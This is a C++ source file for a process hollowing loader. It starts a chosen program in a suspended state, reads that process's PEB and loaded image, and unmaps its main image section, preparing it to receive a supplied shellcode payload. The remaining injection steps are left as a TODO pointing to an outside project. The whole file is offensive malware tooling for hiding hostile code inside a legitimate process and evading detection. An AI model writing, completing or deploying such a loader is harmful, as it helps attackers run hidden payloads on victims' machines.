#include "process_hallowing.h"
#include "internal.h"
#include "pe.h"

bool InitializeHollowProcess(STARTUPINFOA *&pStartupInfo, PROCESS_INFORMATION *&pProcessInfo, PPEB &pPEB, PLOADED_IMAGE &pImage, char *targetPath) {
    PRINT("creating process", PRINT_DEBUG);
    pStartupInfo = new STARTUPINFOA();
    pProcessInfo = new PROCESS_INFORMATION();

    CreateProcessA(0, targetPath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, pStartupInfo, pProcessInfo);
    if (!pProcessInfo->hProcess) {
        PRINT("failed to create process", PRINT_ERROR);
        return false;
    }

    pPEB = ReadRemotePEB(pProcessInfo->hProcess);
    if (!pPEB) {
        PRINT("failed to read remote peb", PRINT_ERROR);
        return false;
    }

    pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);
    if (!pImage) {
        PRINT("failed to read remote image", PRINT_ERROR);
        return false;
    }

    return true;
}

bool UnmapDestinationSection(HANDLE process, PPEB pPEB) {
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

    auto NtUnmapViewOfSection = (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
    DWORD dwResult = NtUnmapViewOfSection(
            process,
            pPEB->ImageBaseAddress
    );

    if (dwResult) {
        PRINT("failed to unmap destination section", PRINT_ERROR);
        return false;
    }

    return true;
}

void CreateHollowProcess(char *targetPath, const std::vector<BYTE> &shellcode) {
    if (targetPath == nullptr) {
        PRINT("target path is empty", PRINT_ERROR);
        return;
    }

    if (shellcode.empty()) {
        PRINT("shellcode vector is empty", PRINT_ERROR);
        return;
    }

    STARTUPINFOA *pStartupInfo = nullptr;
    PROCESS_INFORMATION *pProcessInfo = nullptr;
    PPEB pPEB = nullptr;
    PLOADED_IMAGE pImage = nullptr;

    if (!InitializeHollowProcess(pStartupInfo, pProcessInfo, pPEB, pImage, targetPath)) {
        goto cleanup;
    }

    if (!UnmapDestinationSection(pProcessInfo->hProcess, pPEB)) {
        goto cleanup;
    }

    // TODO Continue implementation: https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp

cleanup:
    if (pStartupInfo != nullptr) {
        delete pStartupInfo;
    }
    if (pProcessInfo != nullptr) {
        delete pProcessInfo;
    }
    if (pPEB != nullptr) {
        delete pPEB;
    }
    if (pImage != nullptr) {
        delete pImage;
    }
}